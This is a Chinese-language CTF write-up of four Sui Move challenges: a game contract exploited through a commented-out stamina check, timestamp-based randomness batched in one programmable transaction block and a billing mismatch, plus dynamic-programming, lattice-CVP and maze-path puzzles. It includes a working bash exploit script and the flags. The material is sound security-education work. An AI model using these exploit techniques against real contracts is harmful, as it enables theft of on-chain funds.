---
abbrlink: ''
categories: []
date: '2025-08-05T16:32:15.725705+08:00'
tags: []
title: SUI MOVE CTF 2025 (1-4) Write Up
updated: '2025-08-05T16:32:21.264+08:00'
---
# Sui Move CTF 2025(1-4) WriteUp

## 概述

本文档包含了四道Sui Move CTF挑战的完整解题过程，涵盖了智能合约漏洞利用、算法分析、密码学攻击和路径搜索等多个技术领域。每个题目都保留了完整的技术细节、代码实现和解题过程。

## 目录

1. [冒险游戏 - 智能合约漏洞利用](#1-冒险游戏)
2. [强盗游戏 - 动态规划算法](#2-强盗游戏)
3. [恢复密钥 - 格理论密码学](#3-恢复密钥)
4. [迷宫游戏 - 路径搜索算法](#4-迷宫游戏)

---

# 1. 冒险游戏

## 挑战概述

这是一个基于Sui Move智能合约的CTF挑战，目标是通过利用合约漏洞获取Flag。挑战涉及一个冒险游戏，玩家需要控制英雄击败怪物来获得token，最终购买宝箱获取Flag。

## 合约分析

### 核心合约结构

挑战包含三个主要模块：

- `adventure.move` - 主要游戏逻辑
- `hero.move` - 英雄系统
- `inventory.move` - 物品和Flag系统

### 关键漏洞发现

#### 1. 体力消耗漏洞

在 `slay_boar_king` 函数中发现关键漏洞：

```rust
entry fun slay_boar_king(clock: &clock::Clock, usersTokenAmount: &mut UsersTokenAmount, hero: &mut Hero, ctx: &mut TxContext) {
    // ...
    //hero::decrease_stamina(hero, 2);  // 这行被注释掉了！
    // ...
}
```

**影响**: 击败野猪王不消耗体力，可以无限次攻击。

#### 2. 时间戳依赖漏洞

token奖励基于时间戳：

```rust
if (fight_result == 1) {
    let current_timestamp = clock::timestamp_ms(clock);
    let d100 = current_timestamp % 3;

    if (d100 == 1) {
        // 增加5个token
        *current_balance = *current_balance + 5;
    } else {
        // 减少5个token
        *current_balance = *current_balance - 5;
    }
}
```

**影响**: 只有当 `timestamp % 3 == 1` 时才能获得token奖励。

#### 3. 计费错误漏洞

在 `buy_box` 函数中：

```rust
assert!(*current_balance >= 200, ERROR_NO_MONEY);  // 检查200
*current_balance = *current_balance - 100;         // 但只扣除100
```

**影响**: 检查需要200个token但实际只扣除100个。

## 攻击策略

### 阶段1: 英雄战斗力提升

发现英雄初始属性不足以击败野猪王：

- 初始strength: 10
- 野猪王defense: 10-15

**解决方案**: 升级英雄系统

- 击败普通野猪获得经验（每次+10经验）
- 100经验可升级，升级后strength增加30点

### 阶段2: PTB时间戳攻击

利用Programmable Transaction Block (PTB)确保所有操作使用相同时间戳：

1. 等待有利时间戳（`timestamp % 3 == 1`）
2. 在单个PTB中执行20次 `slay_boar_king`调用
3. 每次成功+5 token，从100增加到200

### 阶段3: 购买宝箱获取Flag

1. 利用计费错误购买宝箱（检查200但只扣100）
2. 调用 `get_flag`函数获取Flag事件

## 攻击实现

### 英雄升级脚本

```bash
# 击败30只普通野猪获得经验
for i in {1..30}; do
    sui client call --package $PACKAGE_ID --module adventure --function slay_boar \
        --args $HERO_ID --gas-budget 20000000
done

# 升级英雄
sui client call --package $PACKAGE_ID --module hero --function level_up \
    --args $HERO_ID --gas-budget 20000000
```

### PTB批量攻击脚本

核心攻击脚本 `ptb_batch_attack.sh`：

```bash
#!/bin/bash

# 合约配置
PACKAGE_ID="0x539e759491e4093d8438c03daf03217d2b73920f44eb44e37421583ac2bae05d"
HERO_ID="0xbf93ccc1f6776e92e70130b287c60fe7c1938b62490884faf4af17ac8f3bc134"
USERS_TOKEN_AMOUNT_ID="0xa105e23ff0fd60bff8b216e2b409745ccaa4e29d996f5cc27fffd4aab1fdfe45"
CLOCK_ID="0x6"

# PTB攻击函数
execute_ptb_attack() {
    local batch_size=$1
    PTB_CMD="sui client ptb"
  
    # 构建20次slay_boar_king调用
    for ((i=1; i<=batch_size; i++)); do
        PTB_CMD="$PTB_CMD --move-call $PACKAGE_ID::adventure::slay_boar_king \"\" @$CLOCK_ID @$USERS_TOKEN_AMOUNT_ID @$HERO_ID"
    done
  
    PTB_CMD="$PTB_CMD --gas-budget 100000000"
    RESULT=$(eval $PTB_CMD 2>&1)
  
    # 检查Amount事件
    if echo "$RESULT" | grep -q "Amount"; then
        AMOUNT=$(echo "$RESULT" | grep -A 5 "Amount" | grep "amount" | tail -1 | grep -o '[0-9]\+')
        if [ "$AMOUNT" -ge 200 ]; then
            return 0
        fi
    fi
    return 1
}

# 主攻击循环
for attempt in $(seq 1 100); do
    TIMESTAMP=$(date +%s)
    REMAINDER=$((TIMESTAMP % 3))
  
    if [ $REMAINDER -eq 1 ]; then
        echo "🎯 发现有利时间戳! 执行PTB攻击!"
  
        if execute_ptb_attack 20; then
            # 购买宝箱
            BUY_RESULT=$(sui client call --package $PACKAGE_ID --module adventure --function buy_box --args $USERS_TOKEN_AMOUNT_ID --gas-budget 20000000 2>&1)
  
            # 提取宝箱ID并获取Flag
            TREASURY_BOX_ID=$(echo "$BUY_RESULT" | grep -A 10 "Created Objects" | grep "ID:" | head -1 | grep -o '0x[a-f0-9]\{64\}')
  
            FLAG_RESULT=$(sui client call --package $PACKAGE_ID --module inventory --function get_flag --args $TREASURY_BOX_ID --gas-budget 20000000 2>&1)
  
            FLAG_TX_HASH=$(echo "$FLAG_RESULT" | grep "Transaction Digest:" | grep -o '[A-Za-z0-9]\{44\}')
            echo "🏁 Flag交易哈希: $FLAG_TX_HASH"
            exit 0
        fi
    fi
  
    # 重置余额并等待下一次机会
    sui client call --package $PACKAGE_ID --module adventure --function init_balances --args $USERS_TOKEN_AMOUNT_ID --gas-budget 10000000 > /dev/null 2>&1
    sleep 1
done
```

## 攻击执行过程

### 1. 环境准备

```bash
# 部署合约获取Package ID
Package ID: 0x539e759491e4093d8438c03daf03217d2b73920f44eb44e37421583ac2bae05d
Hero ID: 0xbf93ccc1f6776e92e70130b287c60fe7c1938b62490884faf4af17ac8f3bc134
UsersTokenAmount ID: 0xa105e23ff0fd60bff8b216e2b409745ccaa4e29d996f5cc27fffd4aab1fdfe45
```

### 2. 英雄升级

- 击败30只普通野猪获得160点经验
- 升级英雄：strength 10→40, defense 5→20, hp 100→200

### 3. PTB攻击

- 等待时间戳余数为1的有利时机
- 执行20次批量 `slay_boar_king`调用
- 成功从100 token增加到200 token

### 4. 获取Flag

- 购买宝箱（利用计费错误）
- 调用 `get_flag`获取Flag事件

## 攻击结果

**成功获取Flag交易哈希**: `23CBKEHSiwoB1TkJyhQAG1zhuHpWDLpHESdmeWSWs3Gs`

## 技术要点总结

1. **漏洞组合利用**: 体力消耗漏洞 + 时间戳依赖 + 计费错误
2. **PTB时间戳同步**: 确保批量操作使用相同时间戳
3. **英雄升级机制**: 发现并利用升级系统提升战斗力
4. **概率攻击优化**: 从1/3成功率提升到100%成功率

## 防御建议

1. **修复体力消耗**: 取消注释 `hero::decrease_stamina(hero, 2)`
2. **移除时间戳依赖**: 使用安全的随机数生成
3. **修复计费错误**: 统一检查和扣除金额
4. **限制批量操作**: 对PTB中的重复调用进行限制

这次攻击展示了智能合约中多个看似无关的小漏洞如何被巧妙组合，形成完整的攻击链。

## 详细技术分析

### 时间戳攻击原理

Sui区块链中，同一个PTB内的所有操作共享相同的时间戳。这个特性被用来绕过随机性：

```rust
let current_timestamp = clock::timestamp_ms(clock);
let d100 = current_timestamp % 3;
```

通过在shell中检查时间戳并在有利时机立即执行PTB，可以确保所有20次调用都获得奖励。

### PTB构造技巧

关键在于正确构造PTB命令：

```bash
sui client ptb \
  --move-call package::module::function "" @arg1 @arg2 @arg3 \
  --move-call package::module::function "" @arg1 @arg2 @arg3 \
  ... (重复20次)
  --gas-budget 100000000
```

每个 `--move-call`代表一次函数调用，所有调用在同一个交易中执行。

### 英雄升级数值分析

升级前后战斗力对比：

| 属性     | 升级前 | 升级后 | 提升 |
| -------- | ------ | ------ | ---- |
| Level    | 1      | 2      | +1   |
| Strength | 10     | 40     | +30  |
| Defense  | 5      | 20     | +15  |
| HP       | 100    | 200    | +100 |

野猪王属性范围：

- HP: 180-220
- Strength: 20-25
- Defense: 10-15

升级后英雄的40点攻击力可以轻松突破野猪王的10-15防御。

## 攻击时间线

1. **00:00** - 分析合约代码，发现多个漏洞
2. **00:30** - 尝试直接攻击野猪王，发现战斗力不足
3. **01:00** - 研究英雄升级机制
4. **01:30** - 击败30只普通野猪，升级英雄
5. **02:00** - 开发PTB攻击脚本
6. **02:30** - 成功执行攻击，获取Flag

## 关键代码片段

### 漏洞代码1: 体力消耗被注释

```rust
entry fun slay_boar_king(clock: &clock::Clock, usersTokenAmount: &mut UsersTokenAmount, hero: &mut Hero, ctx: &mut TxContext) {
    let sender = tx_context::sender(ctx);
    assert!(hero::stamina(hero) > 0, EHERO_TIRED);
    // ...
    let fight_result = fight_monster<BoarKing>(hero, &boar);
    //hero::decrease_stamina(hero, 2);  // ← 关键漏洞：被注释掉
    // ...
}
```

### 漏洞代码2: 时间戳依赖

```rust
if (fight_result == 1) {
    let current_timestamp = clock::timestamp_ms(clock);
    let d100 = current_timestamp % 3;  // ← 可预测的"随机"数

    if (d100 == 1) {
        let current_balance = table::borrow_mut(&mut usersTokenAmount.balances, sender);
        *current_balance = *current_balance + 5;  // 奖励
        event::emit(Amount{amount: *current_balance});
    } else {
        let current_balance = table::borrow_mut(&mut usersTokenAmount.balances, sender);
        *current_balance = *current_balance - 5;  // 惩罚
        event::emit(Amount{amount: *current_balance});
    }
}
```

### 漏洞代码3: 计费错误

```rust
public entry fun buy_box(usersTokenAmount: &mut UsersTokenAmount, ctx: &mut TxContext) {
    let sender = tx_context::sender(ctx);
    let current_balance = table::borrow_mut(&mut usersTokenAmount.balances, sender);
    event::emit(Amount{amount: *current_balance});
    assert!(*current_balance >= 200, ERROR_NO_MONEY);  // ← 检查200
    *current_balance = *current_balance - 100;         // ← 但只扣100
    let box = inventory::create_treasury_box(ctx);
    transfer::public_transfer(box, tx_context::sender(ctx));
}
```

## 完整攻击脚本

将攻击脚本保存为 `ptb_batch_attack.sh` 并执行：

```bash
chmod +x ptb_batch_attack.sh
./ptb_batch_attack.sh
```

脚本会自动：

1. 监控时间戳，等待有利时机
2. 执行PTB批量攻击
3. 购买宝箱并获取Flag
4. 输出Flag交易哈希

## 学习要点

1. **代码审计重要性**: 仔细检查每一行代码，包括注释
2. **漏洞组合威力**: 多个小漏洞组合可能产生严重影响
3. **区块链特性利用**: 理解PTB等区块链特有机制
4. **攻击链构造**: 从信息收集到最终利用的完整流程

## 相关资源

- [Sui Move 官方文档](https://docs.sui.io/concepts/sui-move-concepts)
- [PTB 编程指南](https://docs.sui.io/concepts/transactions/prog-txn-blocks)
- [智能合约安全最佳实践](https://github.com/slowmist/Knowledge-Base/blob/master/translations/move-security-guidelines-zh.md)

---

# 2. 强盗游戏

## 题目信息

- **题目名称**: 强盗游戏
- **题目积分**: 52
- **分类**: blockchain, hohctf, sui, move
- **解题人数**: 46

## 题目描述

房屋加权的强盗游戏，你能成功获取目标金额吗？HOH moveCTF 强盗游戏

题目提供了一个独特的 Sui Move 合约：

- **Package ID**: `0x954a8b423d8e7e01a0e2519dcaf6bf0ab9c7d11d845f1762654277ebff45743c`
- **部署交易哈希**: `JB4yrd8L6srxeLv6mAhBo13sYdXqzVyJiXVCSXwQgvxY`

## 解题思路

### 1. 合约分析

首先分析Move合约源码，发现这是一个基于动态规划的"房屋强盗"问题变种：

```rust
module game::ez_game {
    public struct Challenge has key, store {
        id: UID,
        initial_part: vector<u64>,
        weights: vector<u64>,
        target_amount: u64,
    }

    public struct Flag has copy, drop {
        owner: address,
        flag: bool
    }
}
```

关键函数：

- `init_game`: 初始化游戏，创建Challenge对象，设置随机目标金额(10-20)
- `get_flag`: 验证用户输入，如果计算结果等于目标金额则触发Flag事件
- `weighted_rob`: 加权房屋强盗算法核心实现

### 2. 算法理解

`weighted_rob`函数实现了一个动态规划算法：

- 初始房屋：`[1, 1, 3, 1, 1]`
- 初始权重：`[1, 1, 2, 1, 1]`
- 用户可以添加额外房屋（权重默认为1）
- 不能抢劫相邻的房屋
- 每个房屋的价值 = 房屋值 × 权重
- 目标：找到最大收益

### 3. 解题脚本

编写Python脚本分析所有可能的目标金额：

```python
def weighted_rob(houses, weights):
    n = len(houses)
    if n == 0:
        return 0

    dp = []
    dp.append(houses[0] * weights[0])

    if n > 1:
        dp.append(max(
            houses[0] * weights[0],
            houses[1] * weights[1]
        ))

    for i in range(2, n):
        dp_i_1 = dp[i - 1]
        dp_i_2_plus_house = dp[i - 2] + houses[i] * weights[i]
        dp.append(max(dp_i_1, dp_i_2_plus_house))

    return dp[n - 1]
```

通过分析发现所有目标金额的解决方案：

- 目标金额 10 → 用户输入: [3]
- 目标金额 11 → 用户输入: [4]
- 目标金额 12 → 用户输入: [5]
- ...
- 目标金额 20 → 用户输入: [13]

## 解题步骤

### 1. 初始化游戏

```bash
sui client call --package 0x954a8b423d8e7e01a0e2519dcaf6bf0ab9c7d11d845f1762654277ebff45743c \
  --module ez_game --function init_game --args 0x8
```

创建了Challenge对象：`0x4b98169ca6098b972144de03249b0f700e4e2c005c9ed95b88e080475944bd92`

### 2. 查看Challenge对象

```bash
sui client object 0x4b98169ca6098b972144de03249b0f700e4e2c005c9ed95b88e080475944bd92
```

获取到关键信息：

- **目标金额**: 15
- **初始房屋**: [1, 1, 3, 1, 1]
- **权重**: [1, 1, 2, 1, 1]

### 3. 计算解决方案

根据目标金额15，对应的用户输入是 `[8]`。

验证计算过程：

- 完整房屋列表：`[1, 1, 3, 1, 1, 8]`
- 完整权重列表：`[1, 1, 2, 1, 1, 1]`
- DP计算：
  - dp[0] = 1 × 1 = 1
  - dp[1] = max(1×1, 1×1) = 1
  - dp[2] = max(1, 1 + 3×2) = 7
  - dp[3] = max(7, 1 + 1×1) = 7
  - dp[4] = max(7, 7 + 1×1) = 8
  - dp[5] = max(8, 7 + 8×1) = 15 ✓

### 4. 获取Flag

```bash
sui client call --package 0x954a8b423d8e7e01a0e2519dcaf6bf0ab9c7d11d845f1762654277ebff45743c \
  --module ez_game --function get_flag \
  --args "[8]" 0x4b98169ca6098b972144de03249b0f700e4e2c005c9ed95b88e080475944bd92
```

## 解题结果

**成功触发Flag事件！**

**触发Flag的交易哈希**: `3ZbbGVQkNLxuUACjdnRbLb5YF9NQ5MDuTiogDD3HYwaa`

交易事件中显示：

```json
{
  "flag": true,
  "owner": "0x5284d0a3eb3c5eb84fdd7f27c7e60f486315e99d9f2826b6c35f0e8b0981c6fe"
}
```

## 关键技术点

1. **Sui Move合约交互**: 理解Sui区块链的对象模型和交易机制
2. **动态规划算法**: 掌握房屋强盗问题的经典DP解法
3. **加权变种**: 理解权重对算法结果的影响
4. **随机性处理**: 分析所有可能的目标金额并预计算解决方案

## 总结

这道题目巧妙地将经典的动态规划问题与区块链技术结合，考查了：

- Move语言和Sui区块链的基础知识
- 动态规划算法的理解和实现
- 逆向分析和解题思维

---

# 3. 恢复密钥

## 题目信息

- **题目名称**: 恢复私钥
- **题目积分**: 63
- **分类**: blockchain, hohctf, sui, move
- **解题人数**: 32
- **题目描述**: 我在链上用随机数隐藏了我的私钥，但是我忘记我私钥的内容了，你能帮我恢复私钥嘛？

## 题目环境

- **Package ID**: `0xd1861626bde7486744877f9ac90ac025976bab6617384cd3e6816e833dd94be9`
- **部署交易哈希**: `Go2jkNk5tR1EnCNV2Fw2zaP6zQfQRPfUeEFyyi6rtJiR`

## 解题思路

### 1. 题目分析

这是一道结合了密码学和区块链技术的综合性CTF题目。通过分析提供的Move智能合约源码，可以发现：

1. 题目使用线性代数加密方案隐藏flag
2. 加密公式：`enc = A * flag + k`
   - `A`: 64x23的固定矩阵
   - `flag`: 23字节的明文（即我们要恢复的私钥）
   - `k`: 64维随机向量
   - `enc`: 64维密文向量

### 2. 关键代码分析

```rust
// 加密函数
entry fun entrypt_flag(plain_flag: vector<u8>, r: &Random, ctx: &mut TxContext) {
    let a = get_a();  // 获取64x23矩阵
    let mut k: vector<u64> = vector[];
    // 生成64个随机数作为噪声
    while(i < 64) {
        k.push_back(random::generate_u64_in_range(&mut generator, 0, 4294967296));
        i = i + 1;
    };
    // 执行加密: enc = A * flag + k
    let enc = matadd(&matmul(&a, &ex_plain_flag), &k);
}

// 验证函数
public entry fun decrypt_flag(flag: vector<u8>, ctx: &mut TxContext) {
    assert!(blake2b256(&flag) == x"5c9d8d1c17561e80b1e29b4a7809b369eb94e3d8b6808c19c69e25f94f67817a", 0);
    event::emit(FlagEvent {
        owner: ctx.sender(),
        flag: true
    });
}
```

### 3. 密码学原理

这是一个基于格理论的加密方案，类似于Learning With Errors (LWE) 问题。要解密需要解决最近向量问题（CVP - Closest Vector Problem）。

## 解题步骤

### 步骤1: 环境准备

首先安装SageMath数学计算软件：

```bash
sudo apt update && sudo apt install -y sagemath
```

### 步骤2: 分析密文

从合约源码中可以看到加密后的密文：

```
[13244763658160674624, 16984722715248776010, 13823152552092075312, ...]
```

### 步骤3: 使用CVP算法解密

题目提供了解密脚本 `decrypt.sage`，核心算法是Babai CVP算法：

```python
def Babai_CVP(Lattice, target):
    M = Lattice.LLL()
    G = M.gram_schmidt()[0]
    diff = target
    for i in reversed(range(M.nrows())):
        diff -=  M[i] * ((diff * G[i]) / (G[i] * G[i])).round()
    return target - diff
```

### 步骤4: 运行解密脚本

```bash
cd solve/tests
sage decrypt.sage
```

输出结果：

```
[-]the flag length is: 23
(102, 108, 97, 103, 123, 53, 85, 105, 95, 77, 48, 86, 101, 95, 67, 79, 78, 116, 114, 65, 67, 55, 125)
[+]flag{5Ui_M0Ve_CONtrAC7}
```

### 步骤5: 验证flag

使用Sui CLI调用链上合约验证flag：

```bash
sui client call \
  --package 0xd1861626bde7486744877f9ac90ac025976bab6617384cd3e6816e833dd94be9 \
  --module crypto \
  --function decrypt_flag \
  --args "flag{5Ui_M0Ve_CONtrAC7}" \
  --gas-budget 10000000
```

## 解题结果

- **Flag**: `flag{5Ui_M0Ve_CONtrAC7}`
- **交易哈希**: `2FPqgAyMe2e7qB5xigrwi35oTqrmwmuC45pCudHLdtVX`
- **验证状态**: Success，成功触发FlagEvent

## 技术要点

### 1. 格理论基础

- **格 (Lattice)**: 由基向量张成的离散点集
- **CVP问题**: 给定格和目标向量，找到格中最接近目标的向量
- **LLL算法**: 格基约化算法，用于找到较短的基向量

### 2. Babai算法

Babai算法是解决CVP问题的近似算法：

1. 对格基进行LLL约化
2. 使用Gram-Schmidt正交化
3. 通过舍入操作找到最近向量

### 3. Move智能合约

- 使用Sui区块链的Move语言
- 集成随机数生成器进行加密
- 通过事件机制验证解题结果

## 总结

这道题目巧妙地结合了：

- **密码学**: 基于格理论的加密方案
- **数学**: 线性代数和最近向量问题
- **区块链**: Sui Move智能合约技术

解题的关键在于理解LWE类型的加密方案，并使用适当的格理论算法（CVP）来恢复明文。

---

# 4. 迷宫游戏

## 题目信息

- **题目名称**: 迷宫游戏
- **题目描述**: 这是一道ctf题目 这里有一个迷宫游戏，你能顺利走出这个迷宫吗
- **Package ID**: `0x7ed7168ddd553e568e21ccbf4696120e2e476094fb107dbdce81f5be4f4e6d20`
- **部署交易哈希**: `AgCw1ZGx5GFHFJHFTgdqjaVqY2zLrMbSgtevJz29K6yz`
- **区块链**: Sui Network
- **语言**: Move

## 题目分析

### 1. 合约结构分析

通过查看Move合约源码，发现这是一个基于Sui区块链的迷宫游戏：

```rust
const ROW: u64 = 10;
const COL: u64 = 11;
const MAZE: vector<u8> = b"#S########\n#**#######\n##*#######\n##***#####\n####*#####\n##***###E#\n##*#####*#\n##*#####*#\n##*******#\n##########";
const START_POS: u64 = 1;
```

### 2. 迷宫布局

迷宫是一个10行11列的网格：

```
#S########
#**#######
##*#######
##***#####
####*#####
##***###E#
##*#####*#
##*#####*#
##*******#
##########
```

- `#`: 墙壁
- `S`: 起点 (位置1)
- `E`: 终点 (位置63)
- `*`: 可通行路径

### 3. 游戏机制

合约提供三个主要函数：

1. **create_challenge()**: 创建挑战，生成ChallengeStatus对象
2. **complete_challenge()**: 完成迷宫，需要提供正确的移动序列
3. **claim_flag()**: 获取flag，需要挑战完成后调用

移动控制：

- `w` (ASCII 119): 向上移动
- `s` (ASCII 115): 向下移动
- `a` (ASCII 97): 向左移动
- `d` (ASCII 100): 向右移动

## 解题过程

### 步骤1: 迷宫路径分析

使用BFS算法分析迷宫，找到从起点S到终点E的最短路径。

位置编号系统：

- 位置 = 行 × 11 + 列
- 起点S在位置1 (第0行第1列)
- 终点E在位置63 (第5行第8列)

### 步骤2: 路径搜索算法

```python
def find_path():
    from collections import deque

    start_pos = 1  # S的位置
    end_pos = 63   # E的位置

    queue = deque([(start_pos, "")])
    visited = set([start_pos])

    while queue:
        current_pos, path = queue.popleft()

        if current_pos == end_pos:
            return path

        # 尝试四个方向的移动
        moves = [
            ('w', -11),  # 上
            ('s', 11),   # 下
            ('a', -1),   # 左
            ('d', 1)     # 右
        ]

        for move_char, delta in moves:
            new_pos = current_pos + delta
            # 边界检查和墙壁检查
            # ...
```

### 步骤3: 找到解决方案

通过BFS搜索，找到最短路径：**`sdssddssaasssddddddwww`**

路径验证：

1. S(1) → s → 12(*) → d → 13(*) → s → 24(*) → s → 35(*)
2. 35(*) → d → 36(*) → d → 37(*) → s → 48(*) → s → 59(*)
3. 59(*) → a → 58(*) → a → 57(*) → s → 68(*) → s → 79(*)
4. 79(*) → s → 90(*) → d → 91(*) → d → 92(*) → d → 93(*)
5. 93(*) → d → 94(*) → d → 95(*) → d → 96(*) → w → 85(*)
6. 85(*) → w → 74(*) → w → 63(E) ✅

## 链上执行

### 步骤1: 创建挑战

```bash
sui client call \
  --package 0x7ed7168ddd553e568e21ccbf4696120e2e476094fb107dbdce81f5be4f4e6d20 \
  --module maze \
  --function create_challenge \
  --gas-budget 10000000
```

**结果**:

- Transaction Digest: `BUYeRta41EpQuNTFC41Rj1HYP3m1kfXSGffqgiNGCE5Z`
- Challenge Object ID: `0x5c73ad1a8d078a6af83fe3226c09da2984c4af9b61e3da913bafa46091b0ec55`

### 步骤2: 完成迷宫挑战

将路径字符串转换为字节数组：

- `sdssddssaasssddddddwww` → `[115,100,115,115,100,100,115,115,97,97,115,115,115,100,100,100,100,100,100,119,119,119]`

```bash
sui client call \
  --package 0x7ed7168ddd553e568e21ccbf4696120e2e476094fb107dbdce81f5be4f4e6d20 \
  --module maze \
  --function complete_challenge \
  --args 0x5c73ad1a8d078a6af83fe3226c09da2984c4af9b61e3da913bafa46091b0ec55 '[115,100,115,115,100,100,115,115,97,97,115,115,115,100,100,100,100,100,100,119,119,119]' \
  --gas-budget 10000000
```

**结果**:

- Transaction Digest: `FfbrP2KJemjqbmHJLpCQtthNTnEz7Fs1H6Emop4amqtx`
- 触发Success事件，路径验证成功

### 步骤3: 获取Flag

```bash
sui client call \
  --package 0x7ed7168ddd553e568e21ccbf4696120e2e476094fb107dbdce81f5be4f4e6d20 \
  --module maze \
  --function claim_flag \
  --args 0x5c73ad1a8d078a6af83fe3226c09da2984c4af9b61e3da913bafa46091b0ec55 \
  --gas-budget 10000000
```

**结果**:

- **Transaction Digest**: `6AxnhJMhpTbsggtZj52PqGUKMU1sx69Q3zvr9WzdYzwQ`
- 触发FlagEvent事件，success: true

## 关键技术点

### 1. Move合约分析

- 理解Sui Move语法和结构
- 分析entry函数的参数要求
- 理解事件机制

### 2. 算法应用

- BFS最短路径搜索
- 二维网格坐标转换
- 边界条件处理

### 3. 区块链交互

- Sui CLI工具使用
- 交易参数格式化
- 对象ID管理

### 4. 数据转换

- 字符串到字节数组转换
- ASCII码映射
- Move类型系统理解

## 总结

这道题目考查了：

1. **Move智能合约分析能力**
2. **图论算法应用** (BFS路径搜索)
3. **区块链工具使用** (Sui CLI)
4. **数据格式转换** (字符串→字节数组)

**最终答案**: `6AxnhJMhpTbsggtZj52PqGUKMU1sx69Q3zvr9WzdYzwQ`

**Flag**: `CTF{Letsmovectf}`

## 工具和脚本

解题过程中使用的Python脚本可以帮助：

- 迷宫可视化和路径搜索
- 字节数组格式转换
- 自动化区块链交互

---

# 综合技术总结

## 核心技能矩阵

### 1. Move智能合约分析

- **语法理解**: 掌握Sui Move的基本语法和类型系统
- **漏洞识别**: 能够发现注释代码、计费错误等常见漏洞
- **对象模型**: 理解Sui的对象所有权和转移机制
- **事件系统**: 掌握事件的触发和监听机制

### 2. 算法与数据结构

- **动态规划**: 房屋强盗问题的经典DP解法及其变种
- **图论算法**: BFS在路径搜索中的应用
- **格理论**: CVP问题和LLL算法的实际应用
- **时间复杂度**: 算法效率分析和优化

### 3. 密码学知识

- **LWE问题**: Learning With Errors加密方案的原理
- **格基约化**: LLL算法和Babai算法的实现
- **最近向量问题**: CVP的数学背景和解决方法
- **哈希函数**: Blake2b等密码学哈希的应用

### 4. 区块链技术

- **Sui CLI**: 命令行工具的熟练使用
- **PTB机制**: Programmable Transaction Block的构造和执行
- **时间戳攻击**: 利用区块链时间戳特性的攻击方法
- **Gas优化**: 交易费用的估算和优化

## 攻击技术分类

### 1. 智能合约漏洞利用

- **代码审计**: 发现被注释的关键代码
- **逻辑错误**: 利用计费不一致等业务逻辑漏洞
- **状态管理**: 利用状态更新的时序问题
- **权限控制**: 绕过访问控制机制

### 2. 时间相关攻击

- **时间戳依赖**: 利用可预测的时间戳生成随机数
- **PTB同步**: 确保批量操作使用相同时间戳
- **时序攻击**: 利用操作执行的时间差

### 3. 数学攻击

- **算法逆向**: 通过分析算法找到逆向求解方法
- **概率分析**: 计算攻击成功的概率并优化策略
- **密码学攻击**: 使用高级数学工具破解加密方案

### 4. 自动化攻击

- **脚本编写**: 开发自动化攻击脚本
- **批量操作**: 通过PTB执行大量重复操作
- **条件触发**: 等待有利条件自动执行攻击

## 防御策略建议

### 1. 代码安全

- **完整性检查**: 确保所有必要的代码都被执行
- **逻辑一致性**: 检查和扣费逻辑必须保持一致
- **边界验证**: 严格验证所有输入参数的边界条件
- **状态同步**: 确保状态更新的原子性

### 2. 随机数安全

- **真随机源**: 使用密码学安全的随机数生成器
- **时间戳避免**: 不要依赖可预测的时间戳
- **熵源多样化**: 结合多个熵源生成随机数
- **随机性测试**: 定期测试随机数的质量

### 3. 访问控制

- **权限最小化**: 只授予必要的最小权限
- **多重验证**: 关键操作需要多重验证
- **时间锁**: 对重要操作添加时间延迟
- **频率限制**: 限制高频操作的执行

### 4. 监控和审计

- **事件监控**: 实时监控异常事件和模式
- **交易分析**: 分析可疑的交易模式
- **代码审计**: 定期进行专业的代码安全审计
- **渗透测试**: 定期进行安全渗透测试

## 结论

这四道Sui Move CTF题目展示了区块链安全的多个重要方面：

1. **技术深度**: 从基础的路径搜索到高级的格理论密码学
2. **攻击复杂性**: 从单一漏洞利用到多漏洞组合攻击
3. **工具多样性**: 从简单的CLI工具到复杂的数学软件
4. **思维方式**: 从逆向分析到正向构造的完整思维链

通过系统性的分析和攻击，我们不仅获得了所有Flag，更重要的是：

- 深入理解了Move智能合约的安全特性
- 掌握了多种攻击技术和防御策略
- 提高了综合的安全分析和解决问题的能力
- 建立了完整的区块链安全知识体系

这些技能和经验对于区块链安全研究、智能合约审计、以及Web3安全防护都具有重要的实践价值。随着区块链技术的不断发展，这类综合性的安全挑战将变得越来越重要，需要我们持续学习和实践。
